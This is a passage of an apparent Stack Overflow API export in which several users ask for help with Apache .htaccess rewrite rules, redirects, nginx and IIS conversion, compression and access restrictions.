^(cache|medias|scripts|css|library)/(.*)$ $1/$2 [L,QSA]\n###############################################################################\n# cas de paramètres pour une page\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)/(.*)\\+([^,]+),(.*)$ run.php5?url=/$1&amp;url_extra=$2&amp;params=$3,$4&amp;fullurl=$1/$2+$3,$4 [QSA,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)/(.*)\\+([^,]+)$ run.php5?url=/$1&amp;url_extra=$2&amp;params=$3&amp;fullurl=$1/$2+$3 [QSA,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)\\+(.*)$ run.php5?url=/index&amp;url_extra=$1&amp;params=$2&amp;fullurl=/$1+$2 [QSA,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^,]+),(.*)$ run.php5?url=/$1&amp;params=$2&amp;fullurl=$1,$2 [QSA,L]\n###############################################################################\n# cas de paramètres pour l'index\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^\\+([^,]+),(.*)$ run.php5?url=/index&amp;url_extra=$1&amp;params=$2&amp;fullurl=/+$1,$2 [QSA,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^,(.*)$ run.php5?url=/index&amp;params=$1&amp;fullurl=/,$1 [QSA,L]\n###############################################################################\n# cas sans paramètres\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^$ run.php5?url=/index&amp;fullurl=/index [QSA,L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ run.php5?url=/$1&amp;fullurl=/$1 [QSA,L]\n</code></pre>\n\n<p>stage/manager/.htaccess :</p>\n\n<pre><code>SetEnv PHP_VER 5\nErrorDocument 404 /manager/404\nAddType application/x-httpd-php .php\nAddType application/x-httpd-php .php5\nAddType application/x-httpd-php .tpl\nDirectoryIndex /manager/index\nRewriteEngine on\nRewriteBase /manager/\n#################################################################################\nRewriteCond %{REQUEST_FILENAME} private/.* [OR]\nRewriteCond %{REQUEST_FILENAME} site/.*\nRewriteRule ^.*$   -   [F]\n###############################################################################\nRewriteRule ^thumb\\/(.*),([0-9]+),([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3 [L,QSA]\nRewriteRule ^thumb\\/(.*),([0-9]+)x([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3 [L,QSA]\nRewriteRule ^thumb\\/(.*),([0-9]+)=([0-9]+)$ _thumb.php5?s=$1&amp;w=$2&amp;h=$3&amp;crop=1 [L,QSA]\n################################################################################\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^,]+),(.*)$ run.php5?url=$1&amp;params=$2 [L,QSA]\n################################################################################\nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^,]+)$ run.php5?url=$1 [L,QSA]\n################################################################################\nRewriteRule ^$ run.php5?url=index [L,QSA]\n</code></pre>\n\n<p>and this is my current nginx conf :</p>\n\n<pre><code>server {\n    listen   80;\n    server_name  stage.*****.com;\n    root /home/duppp/stage;\n    access_log  /var/log/duppp/nginx_access.log;\n    error_log  /var/log/duppp/nginx_error.log;\n\n    client_max_body_size 100m;\n    chunkin on;\n    error_page 411 = @my_411_error;\n    location @my_411_error {\n      chunkin_resume;\n    }\n    location / {\n      autoindex  on;\n      index  index.php index.html index.htm;\n    }\n    location ~* ^.+.(jpg|jpeg|gif|css|png|js|xml)$ {\n      expires 30d;\n      access_log off;\n    }\n\n    location = /favicon.ico {\n      access_log off;\n      return 204;\n    }\n    location ~ /\\.ht {\n      deny  all;\n    }\n    location ~ \\.php.*$ {\n      add_header Access-Control-Allow-Origin *;\n      fastcgi_pass 127.0.0.1:9000;\n      fastcgi_index index.php;\n      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;\n      include fastcgi_params;\n   }\n}\n</code></pre>\n\n<p>I would like to convert the htaccess file into the nginx conf. If anyone want to take this entire task, I can pay him, because it's very important for me.</p>\n\n<p>Thanks a lot</p>\n"},{"tags":["php",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":13228053,"title":"How to rewrite URLs using htaccess only for images","body":"<p>This is the current URL of my images -</p>\n\n<pre><code>http://www.mysite.com/files/thumb/133/595\n</code></pre>\n\n<p>While inspecting it in firebug, this is the code under image tag -</p>\n\n<pre><code>&lt;img src=\"http://www.mysite.com/files/thumb/133/595\" alt=\"This is text\"&gt;\n</code></pre>\n\n<p>Now i want the above URLs to be changed like this -</p>\n\n<pre><code>http://www.mysite.com/files/thumb/133/595/This-is-text.jpg\n</code></pre>\n\n<p>Image extension(<code>.jpg</code> in this case) added automatically on the type of image and alt text is added to the link with space being replaced from <code>-</code>.</p>\n\n<p>How can i achieve this? via <code>htaccess</code> or some other method( project is in <code>php</code>).</p>\n\n<p>How to rewrite my htaccess file that this change will only take place for images only.(Newbie in re-writing).</p>\n"},{"tags":[".htaccess","iis","web-config","modx","modx-evolution"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12666874,"title":"Modx Evolution Rewrite URL Web.Config IIS","body":"<p>I need help converting htaccess into web.config for IIS server.<br>\nThis htaccess is used by Modx Evolution 1.x</p>\n\n<pre><code>#php_flag register_globals Off\n#AddDefaultCharset utf-8\n#php_value date.timezone Europe/Moscow\n\nOptions +FollowSymlinks\nRewriteEngine on\nRewriteBase /\n\n# Fix Apache internal dummy connections from breaking [(site_url)] cache\nRewriteCond %{HTTP_USER_AGENT} ^.*internal\\ dummy\\ connection.*$ [NC]\nRewriteRule .* - [F,L]\n\n# Rewrite domain.com -&gt; www.domain.com -- used with SEO Strict URLs plugin\n#RewriteCond %{HTTP_HOST} .\n#RewriteCond %{HTTP_HOST} !^www\\.example\\.com [NC]\n#RewriteRule (.*) http://www.example.com/$1 [R=301,L]\n\n# Exclude /assets and /manager directories and images from rewrite rules\nRewriteRule ^(manager|assets)/*$ - [L]\nRewriteRule \\.(jpg|jpeg|png|gif|ico)$ - [L]\n\n# For Friendly URLs\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?q=$1 [L,QSA]\n</code></pre>\n\n<p>I need to convert this configuration into web.config for IIS server.</p>\n"},{"tags":["php",".htaccess","codeigniter","pretty-urls"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":11927372,"title":"Codeigniter - controllers in subfolder, remove index.php from url","body":"<p>How can I remove 'index.php' from urls, if I have some controllers in the controllers folder and one in subfolder?\nFor example my frontend url looks like this : <strong>domain.com/site/contact.html</strong>\nI would like my backend url look like this: <strong>domain.com/system/settings/profile.html</strong>, where system is not a controller, only a subfolder in the controllers folder.\nWhen I type <strong>domain.com/index.php/system/settings/profile.html</strong>, everything works fine, it just does not look right.\nHere's what's in my routes.php file:</p>\n\n<pre><code>$route['default_controller'] = \"site\";\n$route['system'] = \"system/login\";\n$route['404_override'] = 'errors/error_404';\n</code></pre>\n\n<p>Here's what's in my .htaccess file:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1    !^(index\\.php|img|css|public|tmp|download|javascript|rte|document|xajax_js|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L,QSA]\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":[".htaccess","url","rewrite"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":21,"score":-1,"question_id":13226593,"title":"subdomain like url htaccess","body":"<pre><code> Allow from all\nOptions -Multiviews\nRewriteEngine On RewriteBase /Fix Rewrite\n\n    Options -Multiviews\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %(REQUEST_FILENAME) !-l\n    RewriteRule ^(.*)$ index.php?rt=$1 [L,QSA] \n</code></pre>\n\n<p>this is my current htaccess file </p>\n\n<p>my framework is done such a way the url looks like\n <strong>www.mydomain.com/controllername/methodname/arguments</strong></p>\n\n<p>Now i want to rename my userprofile page like this<br>\n<strong>username.mydomain.com/edit/ instead of www.mydomain.com/user/edit/username</strong></p>\n\n<p>What should i add to my htaccess? Is that possible?</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":13226110,"title":"What is Best way to redirect www.example.com to example.com","body":"<p>hope you people doing well ! what will be Best way to redirect www.example.com  to  example.com. </p>\n\n<p>I have used .htaccess ,but its giving me problem in Jquery POST call .. </p>\n\n<p>So now i am confused which method i can use for redirecting www </p>\n\n<p>Thanks in advance. </p>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13216827,"title":"htaccess how to remove trailing question mark","body":"<p>How can I use htaccess to strip away the trailing ? from\n<a href=\"http://domain.com/directory/folder/\" rel=\"nofollow\">http://domain.com/directory/folder/</a>?</p>\n\n<p>so it shows like this: </p>\n\n<p><a href=\"http://domain.com/directory/folder/\" rel=\"nofollow\">http://domain.com/directory/folder/</a></p>\n"},{"tags":["php",".htaccess"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13035818,"title":"Renaming URL with HTACCESS","body":"<p>I am building a web app that puts out a link like the following:</p>\n\n<p><a href=\"http://www.website.com/portfolio/first-name/\" rel=\"nofollow\">http://www.website.com/portfolio/first-name/</a></p>\n\n<p>I would like for it to look something like this:</p>\n\n<p><a href=\"http://www.website.com/model/first-name/\" rel=\"nofollow\">http://www.website.com/model/first-name/</a></p>\n\n<p>Is this possible within the HTACCESS?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","rewrite"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":196,"score":1,"question_id":4881430,"title":".htaccess conditional rewriting .html to .php","body":"<p>First to say, sorry if I'm doubleposting, but I didn't find a solution to this one. </p>\n\n<p>I'm trying to rewrite my urls so that, whene I enter somepage.html it serves me somepage.php but ONLY if somepage.html doesn't exist. Anyone can help? Thanks</p>\n"},{"tags":[".htaccess","drupal","redirect"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13221495,"title":"redirect rule for multiple pages","body":"<p>I have page not found erros in webmaster because the page/2/0 part of a url is due to smart paging module clean url feature (Drupal) now i uninstalled the smart paging module but these page not found errors are still there.</p>\n\n<pre><code>www.mysite.com/a/b/c/page/2/0, \nwww.mysite.com/a/d/e/page/3/0, \nwww.mysite.com/a/f/g/page/4/0, \nwww.mysite.com/a/h/i/page/5/0\n</code></pre>\n\n<p>and so on. </p>\n\n<p>I want to redirect </p>\n\n<pre><code>www.mysite.com/a/b/c/page/2/0 to  www.mysite.com/a/b/c\nwww.mysite.com/a/d/e/page/3/0, to www.mysite.com/a/d/e\nwww.mysite.com/a/f/g/page/4/0, to www.mysite.com/a/f/g\nwww.mysite.com/a/h/i/page/5/0  to www.mysite.com/a/h/i\n</code></pre>\n\n<p>with one redirect rule. How to do this</p>\n\n<p>in short i want to remove the page/x/0 part from the url and redirect it to the remaining part of that url.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13222850,"title":"Redirect .php urls to urls without extension","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4026021/remove-php-extension-with-htaccess\">remove .php extension with .htaccess</a>  </p>\n</blockquote>\n\n\n\n<p>I want to make all my website url myurl/webpageexamples.php to be renamed to its non-extension version myurl/webpageexamples -if possible in htaccess- and at the same time redirect all traffic from myurl/webpageexamples.php to the new myurl/webpageexamples.</p>\n\n<p>I have found several to redirect from php to non php like:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)\\.html$ /$1 [L,R=301] \n</code></pre>\n\n<p>What I have:\nmyurl/webpageexamples.php</p>\n\n<p>What I want:\nmyurl/webpageexamples\nhaving SEO score transferred to new myurl/webpageexamples</p>\n\n<p>Thank you</p>\n"},{"tags":[".htaccess","compression","gzip","yslow"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13216095,"title":"Gzip Compression not working","body":"<p>I have a website in which Yslow saying You need to Compress the Components with gzip.</p>\n\n<p>So i have found the below information in my apache response when i echo phpinfo() as my test.php file.</p>\n\n<hr>\n\n<p>SERVER_SOFTWARE                   Apache/2.2.17 (Win32) PHP/5.3.5 \nHTTP_ACCEPT_ENCODING                  gzip, deflate \nAccept-Encoding                   gzip, deflate \ngzip compression                  enabled </p>\n\n<h2>_SERVER[\"HTTP_ACCEPT_ENCODING\"]       gzip, deflate</h2>\n\n<p>And then i followed this tutorial and copied and pasted the below code to my .htaccess file.</p>\n\n<hr>\n\n<pre><code>&lt;IfModule mod_gzip.c&gt;\nmod_gzip_on Yes\nmod_gzip_dechunk Yes\nmod_gzip_keep_workfiles No\nmod_gzip_can_negotiate Yes\nmod_gzip_add_header_count Yes\nmod_gzip_send_vary Yes\nmod_gzip_command_version '/mod_gzip_status'\nmod_gzip_min_http 1000\nmod_gzip_minimum_file_size 300\nmod_gzip_maximum_file_size 512000\nmod_gzip_maximum_inmem_size 60000\nmod_gzip_handle_methods GET POST\nmod_gzip_temp_dir /tmp\nmod_gzip_item_include file \\.html$\nmod_gzip_item_include file \\.php$\nmod_gzip_item_include file \\.pl$\nmod_gzip_item_include file \\.rb$\nmod_gzip_item_include file \\.py$\nmod_gzip_item_include file \\.cgi$\nmod_gzip_item_include file \\.css$\nmod_gzip_item_include file \\.js$\nmod_gzip_item_include mime ^application/javascript$\nmod_gzip_item_include mime ^application/x-javascript$\nmod_gzip_item_include mime ^text/.*\nmod_gzip_item_include mime ^httpd/unix-directory$\nmod_gzip_item_include handler ^cgi-script$\nmod_gzip_item_include handler ^server-status$\nmod_gzip_item_include handler ^server-info$\nmod_gzip_item_include handler ^application/x-httpd-php\nmod_gzip_item_exclude mime ^image/.*\n&lt;/IfModule&gt;\n</code></pre>\n\n<hr>\n\n<p>but it does not make any difference as i m still getting the file compression error as YSlow recommends . </p>\n\n<p>I have also tried some other scripts by referring some other pages tutorials without any success.</p>\n\n<p>Please can anybody give me solution how to solve this ? </p>\n"},{"tags":["php","apache",".htaccess","http-headers","http-status-code-404"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13223212,"title":"php 404 status handling on mvc","body":"<p>Hi there  I'm cannot get 404 status code for pages that aren't in my site. My .htaccess looks like this:</p>\n\n<blockquote>\n  <p>RewriteEngine On</p>\n  \n  <p>RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\n  !-f RewriteCond %{REQUEST_FILENAME} !-l</p>\n  \n  <p>RewriteRule ^(.+)$ index.php?url=$1 [QSA,L]</p>\n</blockquote>\n\n<p>And so all my pages go to index.php from there they go to bootstrap and there it's send to and error controller. In the error View is make a:</p>\n\n<blockquote>\n  <p>header(\"HTTP/1.1 404 Not Found\"); </p>\n</blockquote>\n\n<p>but it give me an error that \"Cannot modify header information - headers already sent by\". Now i do get a 200 Ok status if i delete this line. I think this is because i send everything to index.php and that status is 200 Ok. So how can make the difference for those files from .htaccess? Or do you have another way to deal with this?\nThanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":13115635,"title":".htaccess mod_rewrite - Non-matching patterns","body":"<p>I'm having trouble getting non-matching (negation) mod_rewrite patterns to work.</p>\n\n<p>In the example below I want all requests redirected to \"/promo-page\", however, don't allow a redirect loop (hence the RewriteCond).</p>\n\n<pre><code>### Request URL: http://example.com/promo-page ###\nRewriteCond %{REQUEST_URI} !^/$\nRewriteCond %{REQUEST_URI} !/promo-page\nRewriteRule .* /promo-page [R=302,L]\n</code></pre>\n\n<p>When a request for \"/promo-page\" is made, the RewriteCond rule is ignored and a redirect loop occurs.</p>\n\n<p>Any ideas why the Exclamation Mark (!) isn't working? Is the syntax incorrect?</p>\n\n<p>Thanks in advance.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>I've also tried these rules in an online mod_rewrite tester and they also don't work (if you use \"home\" as the URL and \"/home\" as the REQUEST_URI).</p>\n\n<p><a href=\"http://martinmelin.se/rewrite-rule-tester/\" rel=\"nofollow\">http://martinmelin.se/rewrite-rule-tester/</a></p>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":30,"score":2,"question_id":13223902,"title":".htaccess neat urls, if the $_GET data has a space it redirects to 404 page","body":"<p>Im using .htaccess to turn my url from </p>\n\n<pre><code>www.mysite.com/profile.php?name=name\n</code></pre>\n\n<p>to</p>\n\n<pre><code>www.mysite.com/name/name\n</code></pre>\n\n<p>But I've struck a problem in which if a name has a space instead of showing the user data it takes me to my 404 page.. Ive encoded the names, so that if theres a space it replaces it with %20 but its still not working..\nNames without a space work just fine</p>\n\n<p>Rewrite rules:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([a-zA-Z0-9_-]+)$ profile.php?name=$1\nRewriteRule ^([a-zA-Z0-9_-]+)/$ profile.php?name=$1\n</code></pre>\n"},{"tags":[".htaccess","url","mod-rewrite","dns","mask"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3212,"score":0,"question_id":6042828,"title":".htaccess to mask url and redirect domain name to subdirectory","body":"<p>Hi folks\nI'd appreciate some .htaccess advice.</p>\n\n<p>I have two wordpress installations. \"A\" which is in my ISP's Linux server root directory and \"B\", which is in a subdirectory of the same server called \"directoryB\".</p>\n\n<p>Actual structure is:=\nA.com\nA.com/directoryB/</p>\n\n<p>I own two domain names A.com and B.com. I want people to use the address B.com when accessing everything on directoryB, not A.com/directoryB/.</p>\n\n<p>I want to leave the \"real\" \"A\" alone - no redirections!</p>\n\n<p>I have been assured this can be done using the .htaccess file, but I've failed so far!\nI have managed to \"mask\" the home page of \"B\" using cPanel, but it reverts back to A.com/directoryB/ once you move away from the home page. I'm also not sure if the .htaccess ought to be in the root or subdirectory.</p>\n\n<p>All I want is to mask the A.com/directoryB/ with B.com/ every time it appears on the address bar......</p>\n\n<p>Thanks in advance for any help!</p>\n"},{"tags":["apache",".htaccess","redirect","ip-address"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":650,"score":2,"question_id":1898536,"title":"Need to deny all IPs except mine from accessing site and display friendly error","body":"<p>I need to deny all IPs except mine.</p>\n\n<p>I got my outward facing IP from whatismyip.com. Let's assume it is 200.200.200.200</p>\n\n<p>Here is the beginning of my .htaccess</p>\n\n<pre><code>ErrorDocument 403 /down.html\n\n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from 200.200.200.200\n&lt;/Limit&gt;\n</code></pre>\n\n<p>This works with the denying part - it shows my down.html page. However it denies me even when I place my correct IP in the .htaccess. Am I doing something wrong?</p>\n\n<p>Also the down.html page contains an image - but seeing as all requests are being denied, I had to host it on a different domain to get it to display. My .htaccess skills are a little rusty, but how would I go about allowing that one image request through using .htaccess on this domain?</p>\n"},{"tags":[".htaccess","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":27,"score":1,"question_id":13221806,"title":"How to redirect example.com/x/restofurl to example.com/y/restofurl with htaccess","body":"<p>I have an url like <code>example.com/x</code></p>\n\n<p>How can i redirect it to <code>example.com/y</code> with htaccess.</p>\n\n<p>Btw I dont want to lose rest of url.</p>\n\n<p>Current .htaccess file looks like;</p>\n\n<pre><code>&lt;ifModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    RewriteCond %{REQUEST_FILENAME} !-s\n    RewriteRule ^(.*)\\.[\\d]+\\.(css|js)$ $1.$2 [L]\n\n        RewriteCond %{REQUEST_FILENAME} !-f\n        RewriteRule ^(.*)$ index.php/$1 [NC,QSA,L]\n\n&lt;/ifModule&gt;\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13221558,"title":".htaccess not redirecting to files on specific servers","body":"<p>I have a .htaccess file that redirects all requests of specific extensions to specific folder. I'm receiving an 404 error when trying to access files telling me the file doesn't exist. \nWhen trying to read the files from another PHP file, I read them successfully. \nThis issue happens with any file in any extension, it's not just a single problematic file.</p>\n\n<p>It's important to mention that this .htaccess file works well on my dev server and on 10 other shared hostings I own. It happens only on 2 problematic hostings, so I tend to believe it has something to do with specific Apache configurations.\nI can't enable rewrite logs, it doesn't seem to work on my problematic hostings and mod_rewrite enabled on both servers and works well with wordpress's .htaccess.</p>\n\n<p>This is my .htaccess file:</p>\n\n<p><code>\nRewriteEngine On\nRewriteRule ^(.*\\.(jpg|bmp|tiff|png|css|js|gif))$ /path/to/folder/$1 [L]\n</code></p>\n\n<p>This gives me <code>The requested URL /path/to/folder/style.css was not found on this server.</code></p>\n\n<p>And when I try to read the exact same path using PHP's readfile(), it works fine.</p>\n\n<p>Any help will be appreciated.</p>\n"},{"tags":["linux","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13218206,"title":".htaccess check for cookie first, then valid-user","body":"<p>I have a .htaccess file for a directory on my apache server. Currently this makes use of mod_auth_mysql for user verification to view the directory listing. However, if the user is already logged in to my application (therefore a cookie exists), I want to skip the valid user requirement and therefore eliminate multiple logins.</p>\n\n<p><strong>Current .htaccess</strong></p>\n\n<pre><code>AuthName \"Please don't hack the server, cheers\"\nAuthBasicAuthoritative Off\nAuthUserFile /dev/null\nAuthMySQL On\nAuthType Basic\nAuth_MYSQL on\nAuth_MySQL_Host localhost\nAuth_MySQL_User username\nAuth_MySQL_Password password\nAuthMySQL_DB auth\nAuthMySQL_Password_Table users\nAuth_MySQL_Username_Field username\nAuth_MySQL_Password_Field password\nAuth_MySQL_Empty_Passwords Off\nAuth_MySQL_Encryption_Types Plaintext\nAuth_MySQL_Authoritative On\nrequire user james\n</code></pre>\n\n<p><strong>The Cookie Check</strong></p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_COOKIE} !^cookiename=ok$\nRewriteRule .* / [NC,L]\n</code></pre>\n\n<p>How do I combine these two correctly, to first check for the cookie and allow through if found, and then check for a valid user if the cookie is not found?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","backbone.js"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":18,"score":1,"question_id":13219643,"title":"Backbone JS 404 on htaccess ModRewrite","body":"<p>I have the following in my .htaccess file:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteCond  %{REQUEST_FILENAME} !-f\nRewriteCond  %{REQUEST_FILENAME} !-d\n\nRewriteRule ^api api.php [QSA,L]\n</code></pre>\n\n<p>Which I can browse to just fine - both <code>/api</code> and something like <code>/api/5</code></p>\n\n<p>However, when I try to access the url via backbone I get a 404 error. Not really sure where to go on this one...</p>\n"},{"tags":[".htaccess","mod-rewrite","index","rewrite","clean-urls"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13209647,"title":"htaccess rewrite index.php on root and subfolders","body":"<p>I'm trying to redirect all requests to ./index.php?site=$1 while I only want to use the part behind the last slash.</p>\n\n<p>So I want <code>www.mydomain.com/firstpage</code> to become <code>www.mydomain.com/index.php?site=firstpage</code> and www.mydomain.com/subfolder/anotherpage to become <code>www.mydomain.com/subfolder/index.php?site=anotherpage</code>  </p>\n\n<p>But right now <code>www.mydomain.com/subfolder/anotherpage</code> becomes \n<code>www.mydomain.com/index.php?site=subfolder/anotherpage</code></p>\n\n<p>This is what I've got:</p>\n\n<pre><code>RewriteEngine on\nOptions +SymlinksIfOwnerMatch\nRewriteBase /\n\nRewriteCond %{HTTP_HOST} ^mydomain.com$ [NC]\nRewriteRule ^(.*)$ http://www.mydomain.com/$1 [R=301,L]\n\nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d \nRewriteRule ^(.*)$ /index.php?site=$1 [L]\n</code></pre>\n\n<p>What could I do to redirect only the part after the last slash?<br>\nThank you so much!</p>\n\n<hr>\n\n<h3>SOLUTION:</h3>\n\n<pre><code>RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule (.*/)?([^/]+)$ $1index.php?site=$2 [L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":19,"score":0,"question_id":13209473,"title":".htaccess comingsoon page","body":"<p>I am using .htaccess to redirect all users to a coming soon page whilst allowing my ip address to use the application normally for testing purposes. I am using this part .htaccess</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nOptions +FollowSymlinks\nRewriteEngine on\nRewriteCond %{REMOTE_ADDR} !^1\\.2\\.3\\.4\nRewriteCond %{REQUEST_URI} !\\.(css|gif|ico|jpg|js|png|swf|txt|html)$\nRewriteRule (.*)$ /coming-soon.html [R=302,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>It works fine and redirects everyone apart my ip to the coming-soon.html page. But it seems that the url_rewrites aren't working so MVC paths seem to have been disabled. Not sure what's wrong. </p>\n\n<p>Thanks for your help</p>\n"},{"tags":[".htaccess","etag","litespeed"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13215213,"title":"How Do I Configure eTags?","body":"<p>Using ySlow, it recommends that I use eTags. I never heard of them before today. The question is now, how do I configure eTags? </p>\n\n<p>I just spent the last 2 hours trying to figure this out. I tried adding various recommended scripts to my .htaccess file, but with no luck. ySlow keeps complaining...</p>\n\n<p>My site is a secure site(https) on a litespeed web server. I seen some say you can't configure eTags on a litespeed web server. Is this true?</p>\n\n<p>Thanks.</p>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13215552,"title":"What is wrong with this .htaccess code?","body":"<p>I need to change article and profile links in my site to dynamic ones. i.e.</p>\n\n<ul>\n<li><strong>for article</strong>: <code>site.com/article.php?id=12</code>  becomes <code>site.com/article/this_is_title_of_article</code></li>\n<li><strong>for profile</strong>: <code>site.com/ref.php?user=23</code> becomes <code>site.com/john_doe</code></li>\n</ul>\n\n<p>So I wrote this to <code>.htaccess</code>:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteRule ^(.*)$ ref.php?user=$1 [QSA,L]\nRewriteRule ^articles/(.*)$ article.php?user=$1 [QSA,L]\n</code></pre>\n\n<p>So, for the profile it works. You can type <code>site.com/username</code>, and it works. But, for the articles it does not- it just does not display anything.</p>\n\n<p>I can't understand why if username is more than one word, it does not add underscores between the words: even if I add to the URL like <code>site.com/john_doe</code> it won't work.</p>\n\n<p>So, pretty much, the above code works only for username AND if that username is only one word.</p>\n"},{"tags":[".htaccess","facebook-like","opengraph","facebook-social-plugins"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":29,"score":1,"question_id":13215080,"title":"issue with Open Graph possibly caused by .htaccess Rewrite","body":"<p>Despite many topics on Open Graph, i cant seem to find anything that covers my specific problem.\nI have built a site for a client which consists of a number of static html pages. since completion the client wanted social buttons added and so i have inserted all of the necessary Open Graph protocol meta tags.(see below) </p>\n\n<pre><code>&lt;meta property=\"og:title\" content=\"site name\" /&gt;\n&lt;meta property=\"og:type\" content=\"website\" /&gt;\n&lt;meta property=\"og:url\" content=\"http://www.mydomain.co.uk/page\" /&gt;\n&lt;meta property=\"og:image\"   content=\"http://www.mydomain.co.uk/images/image.jpg\" /&gt;\n&lt;meta property=\"og:description\" content=\"page description\" /&gt;\n</code></pre>\n\n<p>When testing a selected page on the Facebook Object debugger, my included meta tags don't seem to be recognised. I think the problem could be caused by the .htaccess file i have included to remove the need for the '.html' and '.php' ...see below; I believe this is the problem as when i test my site witht he .html it seems to work just fine (so long as .html is included in the \"og:url\" meta tag.) but if not, all kinds of problems occur, and the description Facebook pulls up is actually the text from my css file..?</p>\n\n<pre><code>&lt;Files .htaccess&gt; \norder allow,deny \ndeny from all \n&lt;/Files&gt; \n\nErrorDocument 404 /error404.html\n\nOptions +MultiViews\n\nRewriteEngine on\nRewriteCond %{HTTP_HOST} ^([^.]+\\.co.uk) [NC]\nRewriteRule (.*) http://www.%1/$1 [R=301,L]\n</code></pre>\n\n<p>There may be something simple im missing here but it seems to be getting the better of me. Any help would be amazing! Thanks in advance. </p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13214904,"title":"htaccess not working - view image","body":"<pre><code>Options -MultiViews\nRewriteEngine 